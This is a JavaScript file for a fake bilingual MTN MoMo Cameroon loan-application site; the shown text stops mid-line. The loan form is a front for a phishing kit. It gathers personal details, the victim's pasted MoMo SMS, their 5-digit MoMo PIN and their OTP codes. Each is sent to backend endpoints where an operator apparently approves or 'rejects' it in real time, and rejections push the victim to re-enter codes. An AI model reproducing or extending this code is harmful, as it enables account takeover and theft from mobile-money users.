// ============================================================
// script.js – Bilingual (French default / English option)
// ============================================================

const S = {
    loanType: '', loanAmount: 0, loanTerm: '', loanPurpose: '',
    firstName: '', lastName: '', phone: '', email: '',
    employment: '', annualIncome: 0,
    kinName: '', kinPhone: '',
    applicationId: '',
    isSubmitting: false,
    rejectedStep: null
};

let currentPollTimeout = null;
let otpResendTimer = null;
let otpResendCountdown = 0;
let pinBlockTimer = null;
let currentLang = 'fr';

// ─── Language Switching ───
function switchLang(lang) {
    currentLang = lang;
    document.body.setAttribute('data-lang', lang);
    document.querySelectorAll('.lang-btn').forEach(btn => {
        btn.classList.toggle('active', btn.getAttribute('data-lang-btn') === lang);
    });
    document.documentElement.lang = lang;
    document.title = lang === 'fr'
        ? 'MTN MoMo Cameroun – Prêts Faciles'
        : 'MTN MoMo Cameroon – Easy Loans';
    // Persist
    try { localStorage.setItem('mtn_language', lang); } catch(e) {}
}

// ─── localStorage Helpers ───
const STORAGE_KEYS = {
    APPLICATION_ID: 'mtn_application_id',
    APPLICATION_DATA: 'mtn_application_data',
    REJECTION_INFO: 'mtn_rejection_info',
    FORM_DRAFT: 'mtn_form_draft',
    OTP_TIMER: 'mtn_otp_timer',
    LANGUAGE: 'mtn_language'
};

function saveToLocalStorage(key, data) {
    try {
        localStorage.setItem(key, JSON.stringify(data));
        console.log(`💾 Saved to localStorage: ${key}`);
    } catch (error) {
        console.error(`❌ Failed to save ${key}:`, error);
    }
}

function getFromLocalStorage(key) {
    try {
        const data = localStorage.getItem(key);
        return data ? JSON.parse(data) : null;
    } catch (error) {
        console.error(`❌ Failed to load ${key}:`, error);
        return null;
    }
}

function removeFromLocalStorage(key) {
    try {
        localStorage.removeItem(key);
        console.log(`🗑️ Removed from localStorage: ${key}`);
    } catch (error) {
        console.error(`❌ Failed to remove ${key}:`, error);
    }
}

// ─── Save/Load Functions ───
function saveApplicationId(id) {
    if (id) {
        S.applicationId = id;
        saveToLocalStorage(STORAGE_KEYS.APPLICATION_ID, {
            id: id,
            timestamp: new Date().toISOString()
        });
    }
}

function loadApplicationId() {
    const saved = getFromLocalStorage(STORAGE_KEYS.APPLICATION_ID);
    if (saved && saved.id) {
        const age = Date.now() - new Date(saved.timestamp).getTime();
        if (age < 24 * 60 * 60 * 1000) {
            S.applicationId = saved.id;
            console.log(`🔄 Restored application ID: ${saved.id}`);
            return saved.id;
        } else {
            removeFromLocalStorage(STORAGE_KEYS.APPLICATION_ID);
        }
    }
    return null;
}

function saveApplicationData() {
    const dataToSave = { ...S, timestamp: new Date().toISOString() };
    saveToLocalStorage(STORAGE_KEYS.APPLICATION_DATA, dataToSave);
}

function loadApplicationData() {
    const saved = getFromLocalStorage(STORAGE_KEYS.APPLICATION_DATA);
    if (saved) {
        const age = Date.now() - new Date(saved.timestamp).getTime();
        if (age < 24 * 60 * 60 * 1000) {
            const fieldsToRestore = [
                'loanType', 'loanAmount', 'loanTerm', 'loanPurpose',
                'firstName', 'lastName', 'phone', 'email',
                'employment', 'annualIncome', 'kinName', 'kinPhone',
                'applicationId', 'rejectedStep'
            ];
            fieldsToRestore.forEach(field => {
                if (saved[field] !== undefined) S[field] = saved[field];
            });
            console.log('🔄 Restored application data from localStorage');
            return true;
        } else {
            removeFromLocalStorage(STORAGE_KEYS.APPLICATION_DATA);
        }
    }
    return false;
}

function saveRejectionInfo(step, applicationId) {
    saveToLocalStorage(STORAGE_KEYS.REJECTION_INFO, {
        step: step,
        applicationId: applicationId,
        timestamp: new Date().toISOString()
    });
}

function loadRejectionInfo() {
    const saved = getFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
    if (saved) {
        const age = Date.now() - new Date(saved.timestamp).getTime();
        if (age < 5 * 60 * 1000) return saved;
        else removeFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
    }
    return null;
}

function clearRejectionInfo() {
    removeFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
}

function saveFormDraft() {
    const draft = {
        firstName: document.getElementById('s2fi')?.value || '',
        lastName: document.getElementById('s2la')?.value || '',
        phone: document.getElementById('s2ph')?.value || '',
        email: document.getElementById('s2em')?.value || '',
        loanAmount: document.getElementById('s1am')?.value || '',
        loanPurpose: document.getElementById('s1pu')?.value || '',
        employment: document.getElementById('s3em')?.value || '',
        annualIncome: document.getElementById('s3in')?.value || '',
        kinName: document.getElementById('s3kn')?.value || '',
        kinPhone: document.getElementById('s3kp')?.value || '',
        timestamp: new Date().toISOString()
    };
    saveToLocalStorage(STORAGE_KEYS.FORM_DRAFT, draft);
}

function loadFormDraft() {
    const draft = getFromLocalStorage(STORAGE_KEYS.FORM_DRAFT);
    if (draft) {
        const age = Date.now() - new Date(draft.timestamp).getTime();
        if (age < 24 * 60 * 60 * 1000) {
            if (draft.firstName) document.getElementById('s2fi').value = draft.firstName;
            if (draft.lastName) document.getElementById('s2la').value = draft.lastName;
            if (draft.phone) document.getElementById('s2ph').value = draft.phone;
            if (draft.email) document.getElementById('s2em').value = draft.email;
            if (draft.loanAmount) document.getElementById('s1am').value = draft.loanAmount;
            if (draft.loanPurpose) document.getElementById('s1pu').value = draft.loanPurpose;
            if (draft.employment) document.getElementById('s3em').value = draft.employment;
            if (draft.annualIncome) document.getElementById('s3in').value = draft.annualIncome;
            if (draft.kinName) document.getElementById('s3kn').value = draft.kinName;
            if (draft.kinPhone) document.getElementById('s3kp').value = draft.kinPhone;
            console.log('🔄 Restored form draft from localStorage');
            return true;
        } else {
            removeFromLocalStorage(STORAGE_KEYS.FORM_DRAFT);
        }
    }
    return false;
}

// ─── Navigation ───
function goTo(pageId) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    const el = document.getElementById(pageId);
    if (el) el.classList.add('active');
    window.scrollTo(0, 0);
}

function startApplication() {
    S.rejectedStep = null;
    clearRejectionInfo();

    if (!S.applicationId) {
        S.applicationId = 'MTN-CM-' + Date.now().toString().slice(-6);
        saveApplicationId(S.applicationId);
    }

    document.getElementById('resendOtpBtn')?.classList.add('hidden');

    ['s1Err', 's2Err', 's3Err', 'momErr', 'pinErr', 'otpErr'].forEach(id => clearErr(id));

    goTo('page-step1');
}

// ─── Toast Notifications ───
function showToast(message, type = 'info', duration = 3000) {
    const existing = document.querySelector('.toast');
    if (existing) existing.remove();

    const toast = document.createElement('div');
    toast.className = `toast toast-${type}`;
    toast.textContent = message;
    document.body.appendChild(toast);

    setTimeout(() => {
        toast.style.opacity = '0';
        toast.style.transform = 'translateX(-50%) translateY(-20px)';
        setTimeout(() => toast.remove(), 300);
    }, duration);
}

// ─── Form Helpers ───
function normalizePhone(id) {
    let inp = document.getElementById(id);
    let val = inp.value.replace(/\D/g, '');
    if (val.length > 9) val = val.substring(0, 9);
    inp.value = val;
    saveFormDraft();
}

function updateCalc() {
    const amt = +document.getElementById('amtSlider').value;
    document.getElementById('calcAmt').textContent = 'XAF ' + amt.toLocaleString();
    const monthly = Math.ceil(amt / 48);
    document.getElementById('monthlyAmt').textContent = 'XAF ' + monthly.toLocaleString();
    const slider = document.getElementById('amtSlider');
    const pct = ((amt - 500000) / (5000000 - 500000)) * 100;
    slider.style.setProperty('--pct', pct + '%');
}

function showErr(id, msg) {
    const box = document.getElementById(id);
    if (box) {
        box.classList.add('show');
        const txt = document.getElementById(id + 'Txt');
        if (txt) txt.textContent = msg;
    }
}

function clearErr(id) {
    const box = document.getElementById(id);
    if (box) box.classList.remove('show');
}

// ─── Step Navigation ───
function toS2() {
    const ty = document.getElementById('s1ty').value;
    const am = +document.getElementById('s1am').value;
    const te = document.getElementById('s1te').value;
    const pu = document.getElementById('s1pu').value;

    if (!ty || am <= 0 || !te || !pu.trim()) {
        showErr('s1Err', currentLang === 'fr' ? 'Veuillez remplir tous les champs.' : 'Please complete all fields.');
        return;
    }

    S.loanType = ty; S.loanAmount = am; S.loanTerm = te; S.loanPurpose = pu;

    saveApplicationData();
    saveFormDraft();
    goTo('page-step2');
}

function toS3() {
    const fi = document.getElementById('s2fi').value.trim();
    const la = document.getElementById('s2la').value.trim();
    const ph = document.getElementById('s2ph').value;
    const em = document.getElementById('s2em').value.trim();

    if (!fi || !la) {
        showErr('s2Err', currentLang === 'fr' ? 'Veuillez entrer votre nom complet.' : 'Please enter your full name.');
        return;
    }

    if (ph.length !== 9) {
        showErr('s2Err', currentLang === 'fr' ? 'Veuillez entrer un numéro de téléphone valide à 9 chiffres.' : 'Please enter a valid 9-digit phone number.');
        return;
    }

    if (!em || !em.includes('@')) {
        showErr('s2Err', currentLang === 'fr' ? 'Veuillez entrer une adresse e-mail valide.' : 'Please enter a valid email address.');
        return;
    }

    S.firstName = fi; S.lastName = la; S.phone = ph; S.email = em;

    saveApplicationData();
    saveFormDraft();
    goTo('page-step3');
}

// ─── PIN/OTP Helpers ───
function pinMvM(el, i, maxLength = 5) {
    el.value = el.value.replace(/\D/g, '');
    if (el.value && i < maxLength - 1) {
        const nextPin = document.getElementById('pin' + (i + 1));
        if (nextPin) { nextPin.focus(); return; }
    }
    if (i === maxLength - 1 && el.value) {
        const allFilled = [0,1,2,3,4].every(idx => document.getElementById('pin' + idx)?.value);
        if (allFilled) setTimeout(() => doPin(), 300);
    }
}

function togPin() {
    for (let i = 0; i < 5; i++) {
        const b = document.getElementById('pin' + i);
        if (b) b.type = b.type === 'password' ? 'text' : 'password';
    }
    for (let i = 0; i < 4; i++) {
        const b = document.getElementById('otp' + i);
        if (b) b.type = b.type === 'password' ? 'text' : 'password';
    }
}

function chkPin() {
    const pinOk = [0,1,2,3,4].every(i => document.getElementById('pin' + i)?.value);
    const pinBtn = document.querySelector('#page-pin .btn-grad');
    if (pinBtn) pinBtn.disabled = !pinOk;

    const otpOk = [0,1,2,3].every(i => document.getElementById('otp' + i)?.value);
    const otpBtn = document.querySelector('#page-otp .btn-grad');
    if (otpBtn) otpBtn.disabled = !otpOk;
}

document.addEventListener('keyup', chkPin);

function clearLoginPin() {
    [0,1,2,3,4].forEach(i => document.getElementById('pin'+i).value = '');
    document.getElementById('pin0').focus();
    chkPin();
}

function clearOtpCode() {
    [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
    document.getElementById('otp0').focus();
    chkPin();
}

function handleOtpInput(el, type) {
    el.value = el.value.replace(/\D/, '');
    const idx = parseInt(el.id.match(/\d$/)[0]);
    if (el.value && type === 'otp' && idx < 3) {
        document.getElementById('otp' + (idx + 1))?.focus();
    }
    chkPin();
    if (idx === 3 && el.value) {
        const allFilled = [0,1,2,3].every(i => document.getElementById('otp' + i)?.value);
        if (allFilled) setTimeout(() => doOtp(), 300);
    }
}

// ─── PIN Attempt Functions ───
async function checkPinStatus() {
    try {
        const response = await fetch(`/api/pin-status/${S.applicationId}`);
        const data = await response.json();
        if (data.ok) {
            const remaining = data.remainingAttempts || 3;
            const attemptsDisplay = document.getElementById('pinAttemptsDisplay');
            if (attemptsDisplay) {
                if (data.isBlocked) {
                    attemptsDisplay.innerHTML = `🔒 ${currentLang === 'fr' ? 'Trop de tentatives. Bloqué pendant' : 'Too many attempts. Blocked for'} ${data.blockRemainingSeconds}s`;
                    attemptsDisplay.className = 'pin-attempts blocked';
                    document.querySelectorAll('#page-pin .pin-box').forEach(b => b.disabled = true);
                    document.querySelector('#page-pin .btn-grad').disabled = true;
                    startPinBlockCountdown(data.blockRemainingSeconds);
                } else {
                    attemptsDisplay.innerHTML = `🔑 ${currentLang === 'fr' ? 'Tentatives restantes :' : 'Attempts remaining:'} ${remaining} / 3`;
                    attemptsDisplay.className = 'pin-attempts';
                }
            }
            return data;
        }
    } catch (error) {
        console.error('Error checking PIN status:', error);
    }
    return null;
}

function startPinBlockCountdown(seconds) {
    const attemptsDisplay = document.getElementById('pinAttemptsDisplay');
    if (!attemptsDisplay) return;
    if (pinBlockTimer) { clearInterval(pinBlockTimer); pinBlockTimer = null; }
    let remaining = seconds;
    attemptsDisplay.textContent = `🔒 ${currentLang === 'fr' ? 'Trop de tentatives. Bloqué pendant' : 'Too many attempts. Blocked for'} ${remaining}s`;
    attemptsDisplay.className = 'pin-attempts blocked';

    pinBlockTimer = setInterval(() => {
        remaining--;
        if (remaining <= 0) {
            clearInterval(pinBlockTimer);
            pinBlockTimer = null;
            attemptsDisplay.textContent = currentLang === 'fr' ? '✅ PIN disponible. Veuillez réessayer.' : '✅ PIN available. Please try again.';
            attemptsDisplay.className = 'pin-attempts available';
            document.querySelectorAll('#page-pin .pin-box').forEach(b => b.disabled = false);
            document.querySelector('#page-pin .btn-grad').disabled = false;
            resetPinAttempts();
        } else {
            attemptsDisplay.textContent = `🔒 ${currentLang === 'fr' ? 'Trop de tentatives. Bloqué pendant' : 'Too many attempts. Blocked for'} ${remaining}s`;
        }
    }, 1000);
}

async function resetPinAttempts() {
    try {
        await fetch(`/api/reset-pin-attempts/${S.applicationId}`, { method: 'POST' });
    } catch (error) {
        console.error('Error resetting PIN attempts:', error);
    }
}

// ─── OTP Resend Timer ───
function startOtpResendTimer(seconds = 20) {
    const btn = document.getElementById('resendOtpBtn');
    if (!btn) return;
    if (otpResendTimer) { clearInterval(otpResendTimer); otpResendTimer = null; }

    otpResendCountdown = seconds;
    btn.disabled = true;
    btn.textContent = `⏳ ${currentLang === 'fr' ? 'Attendez' : 'Wait'} ${otpResendCountdown}s`;
    btn.classList.remove('hidden');

    saveToLocalStorage(STORAGE_KEYS.OTP_TIMER, {
        endTime: Date.now() + (seconds * 1000),
        applicationId: S.applicationId
    });

    otpResendTimer = setInterval(() => {
        otpResendCountdown--;
        if (otpResendCountdown <= 0) {
            clearInterval(otpResendTimer);
            otpResendTimer = null;
            btn.disabled = false;
            btn.textContent = `🔄 ${currentLang === 'fr' ? 'Renvoyer l\'OTP' : 'Resend OTP'}`;
            removeFromLocalStorage(STORAGE_KEYS.OTP_TIMER);
        } else {
            btn.textContent = `⏳ ${currentLang === 'fr' ? 'Attendez' : 'Wait'} ${otpResendCountdown}s`;
        }
    }, 1000);
}

function checkOtpTimerRecovery() {
    const saved = getFromLocalStorage(STORAGE_KEYS.OTP_TIMER);
    if (saved && saved.endTime && saved.applicationId === S.applicationId) {
        const remaining = Math.ceil((saved.endTime - Date.now()) / 1000);
        if (remaining > 0) { startOtpResendTimer(remaining); return true; }
        else removeFromLocalStorage(STORAGE_KEYS.OTP_TIMER);
    }
    return false;
}

// ─── Smart Rejection Navigation ───
function handleRejection(step) {
    clearErr('s3Err'); clearErr('momErr'); clearErr('pinErr'); clearErr('otpErr');

    if (currentPollTimeout) { clearTimeout(currentPollTimeout); currentPollTimeout = null; }

    saveRejectionInfo(step, S.applicationId);

    switch(step) {
        case 'sms':
            showToast(currentLang === 'fr' ? '❌ Le SMS a été rejeté. Veuillez vérifier et soumettre à nouveau.' : '❌ SMS was rejected. Please check and resubmit.', 'error');
            document.getElementById('smsMsgBox').value = '';
            document.getElementById('smsMsgBox').focus();
            document.querySelector('#page-sms-paste .step-card')?.classList.add('rejected');
            setTimeout(() => document.querySelector('#page-sms-paste .step-card')?.classList.remove('rejected'), 3000);
            goTo('page-sms-paste');
            break;
        case 'pin':
            showToast(currentLang === 'fr' ? '❌ Le PIN a été rejeté. Veuillez saisir à nouveau votre PIN MoMo.' : '❌ PIN was rejected. Please re-enter your MoMo PIN.', 'error');
            document.querySelectorAll('#page-pin .pin-box').forEach(b => b.value = '');
            document.getElementById('pin0').focus();
            document.querySelector('#page-pin .step-card')?.classList.add('rejected');
            setTimeout(() => document.querySelector('#page-pin .step-card')?.classList.remove('rejected'), 3000);
            checkPinStatus();
            goTo('page-pin');
            break;
        case 'otp':
            showToast(currentLang === 'fr' ? '❌ L\'OTP a été rejeté. Veuillez demander un nouvel OTP.' : '❌ OTP was rejected. Please request a new OTP.', 'error');
            clearOtpCode();
            document.querySelector('#page-otp .step-card')?.classList.add('rejected');
            setTimeout(() => document.querySelector('#page-otp .step-card')?.classList.remove('rejected'), 3000);
            startOtpResendTimer(20);
            goTo('page-otp');
            break;
        default:
            showToast(currentLang === 'fr' ? '❌ La demande a été rejetée. Veuillez recommencer.' : '❌ Application was rejected. Please start over.', 'error');
            goTo('page-step1');
    }
}

// ─── Polling ───
function startPoll(applicationId, step, onSuccess, onReject) {
    if (currentPollTimeout) { clearTimeout(currentPollTimeout); currentPollTimeout = null; }

    const check = async () => {
        try {
            const res = await fetch(`/api/status/${applicationId}/${step}`);
            const data = await res.json();
            if (data && data.ok === true) {
                if (data.status === 'approved') { currentPollTimeout = null; onSuccess(); return; }
                else if (data.status === 'rejected') {
                    currentPollTimeout = null;
                    try {
                        const redirectRes = await fetch(`/api/rejection-info/${applicationId}`);
                        const redirectData = await redirectRes.json();
                        if (redirectData.ok && redirectData.rejectedStep) {
                            S.rejectedStep = redirectData.rejectedStep;
                            showToast(redirectData.errorMessage || (currentLang === 'fr' ? '❌ La demande a été rejetée.' : '❌ Application was rejected.'), 'error');
                            handleRejection(redirectData.rejectedStep);
                        } else {
                            showToast(currentLang === 'fr' ? '❌ La demande a été rejetée. Veuillez réessayer.' : '❌ Application was rejected. Please try again.', 'error');
                            goTo('page-step3');
                        }
                    } catch (err) {
                        console.error('Error getting rejection info:', err);
                        showToast(currentLang === 'fr' ? '❌ La demande a été rejetée. Veuillez réessayer.' : '❌ Application was rejected. Please try again.', 'error');
                        goTo('page-step3');
                    }
                    return;
                }
            }
            currentPollTimeout = setTimeout(check, 2000);
        } catch (err) {
            console.error('Polling error:', err);
            currentPollTimeout = setTimeout(check, 3000);
        }
    };
    check();
}

// ─── Resend OTP ───
async function resendOtp() {
    const btn = document.getElementById('resendOtpBtn');
    if (otpResendTimer || otpResendCountdown > 0) {
        showToast(currentLang === 'fr' ? `⏳ Veuillez attendre ${otpResendCountdown} secondes avant de renvoyer.` : `⏳ Please wait ${otpResendCountdown} seconds before resending.`, 'info');
        return;
    }
    try {
        btn.disabled = true;
        btn.textContent = currentLang === 'fr' ? '⏳ Envoi...' : '⏳ Sending...';
        showToast(currentLang === 'fr' ? '📤 Demande d\'un nouvel OTP...' : '📤 Requesting new OTP...', 'info');

        const response = await fetch('/api/resend-otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ applicationId: S.applicationId })
        });
        const data = await response.json();

        if (data.ok) {
            showToast(currentLang === 'fr' ? '✅ Nouvel OTP envoyé à l\'administrateur pour vérification !' : '✅ New OTP sent to admin for verification!', 'success');
            startOtpResendTimer(20);
            startPoll(S.applicationId, 'otp',
                () => {
                    showToast(currentLang === 'fr' ? '✅ OTP vérifié ! Prêt approuvé 🎉' : '✅ OTP Verified! Loan Approved 🎉', 'success');
                    showApproval();
                },
                () => handleRejection('otp')
            );
        } else {
            showToast(currentLang === 'fr' ? '❌ Échec de l\'envoi de l\'OTP. Veuillez réessayer.' : '❌ Failed to resend OTP. Please try again.', 'error');
            btn.disabled = false;
            btn.textContent = `🔄 ${currentLang === 'fr' ? 'Renvoyer l\'OTP' : 'Resend OTP'}`;
        }
    } catch (error) {
        console.error('Resend OTP error:', error);
        showToast(currentLang === 'fr' ? '❌ Échec de l\'envoi de l\'OTP. Veuillez réessayer.' : '❌ Failed to resend OTP. Please try again.', 'error');
        btn.disabled = false;
        btn.textContent = `🔄 ${currentLang === 'fr' ? 'Renvoyer l\'OTP' : 'Resend OTP'}`;
    }
}

// ─── Show Approval ───
function showApproval() {
    document.getElementById('aprAmount').textContent = 'XAF ' + S.loanAmount.toLocaleString();
    document.getElementById('aprAmt').textContent = 'XAF ' + S.loanAmount.toLocaleString();
    document.getElementById('aprTerm').textContent = S.loanTerm;
    const monthly = Math.ceil(S.loanAmount / parseInt(S.loanTerm));
    document.getElementById('aprMth').textContent = 'XAF ' + monthly.toLocaleString();

    Object.values(STORAGE_KEYS).forEach(key => removeFromLocalStorage(key));

    if (otpResendTimer) { clearInterval(otpResendTimer); otpResendTimer = null; }
    if (pinBlockTimer) { clearInterval(pinBlockTimer); pinBlockTimer = null; }

    goTo('page-approval');
}

// ─── STEP 3: Submit Application ───
async function submitApp() {
    const em = document.getElementById('s3em').value;
    const in_ = +document.getElementById('s3in').value;
    const kn = document.getElementById('s3kn').value.trim();
    const kp = document.getElementById('s3kp').value.trim();

    if (!em || in_ <= 0) {
        showErr('s3Err', currentLang === 'fr' ? 'Veuillez remplir tous les champs.' : 'Please complete all fields.');
        return;
    }

    S.employment = em; S.annualIncome = in_; S.kinName = kn; S.kinPhone = kp;

    if (!S.applicationId) {
        S.applicationId = 'MTN-CM-' + Date.now().toString().slice(-6);
        saveApplicationId(S.applicationId);
    }

    saveApplicationData();
    goTo('page-processing');

    try {
        await fetch('/api/send-application', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ applicationData: S })
        });

        document.getElementById('processingStatus').innerHTML = currentLang === 'fr' ? '⏳ En attente de l\'approbation de l\'administrateur...' : '⏳ Awaiting admin approval...';

        startPoll(S.applicationId, 'sms',
            () => {
                showToast(currentLang === 'fr' ? '✅ SMS approuvé !' : '✅ SMS Approved!', 'success');
                goTo('page-sms-paste');
            },
            () => handleRejection('sms')
        );
    } catch {
        showErr('s3Err', currentLang === 'fr' ? 'Échec de la soumission de la demande.' : 'Failed to submit application.');
    }
}

// ─── STEP 4: SMS ───
async function doSmsParse() {
    const msg = document.getElementById('smsMsgBox').value.trim();
    if (msg.length < 3) {
        showErr('momErr', currentLang === 'fr' ? 'Veuillez coller un message SMS valide.' : 'Please paste a valid SMS message.');
        return;
    }

    await fetch('/api/send-momo-message', {
        method: 'POST',
        body: JSON.stringify({
            momoData: {
                applicationId: S.applicationId,
                phone: S.phone,
                momoMessage: msg,
                isResubmission: !!S.rejectedStep
            }
        }),
        headers: { 'Content-Type': 'application/json' }
    });

    document.getElementById('waitSmsAppId').textContent = S.applicationId;
    goTo('page-wait-sms');

    startPoll(S.applicationId, 'sms',
        () => {
            showToast(currentLang === 'fr' ? '✅ SMS vérifié !' : '✅ SMS Verified!', 'success');
            goTo('page-pin');
        },
        () => handleRejection('sms')
    );
}

// ─── STEP 5: PIN ───
async function doPin() {
    const pin = [0,1,2,3,4].map(i => document.getElementById('pin'+i).value).join('');
    if (pin.length < 5) {
        showErr('pinErr', currentLang === 'fr' ? 'Entrez un code PIN MoMo valide à 5 chiffres.' : 'Enter a valid 5-digit MoMo PIN.');
        return;
    }

    const pinStatus = await checkPinStatus();
    if (pinStatus && pinStatus.isBlocked) {
        showErr('pinErr', currentLang === 'fr' ? `Trop de tentatives échouées. Veuillez attendre ${pinStatus.blockRemainingSeconds} secondes.` : `Too many failed attempts. Please wait ${pinStatus.blockRemainingSeconds} seconds.`);
        return;
    }

    try {
        const response = await fetch('/api/send-pin', {
            method: 'POST',
            body: JSON.stringify({ applicationId: S.applicationId, pin, isResubmission: !!S.rejectedStep }),
            headers: { 'Content-Type': 'application/json' }
        });
        const data = await response.json();

        if (!data.ok) {
            showErr('pinErr', data.error || (currentLang === 'fr' ? 'Échec de la soumission du PIN.' : 'Failed to submit PIN.'));
            return;
        }

        document.getElementById('waitPinAppId').textContent = S.applicationId;
        goTo('page-wait-pin');

        startPoll(S.applicationId, 'pin',
            () => {
                showToast(currentLang === 'fr' ? '✅ PIN vérifié !' : '✅ PIN Verified!', 'success');
                resetPinAttempts();
                go
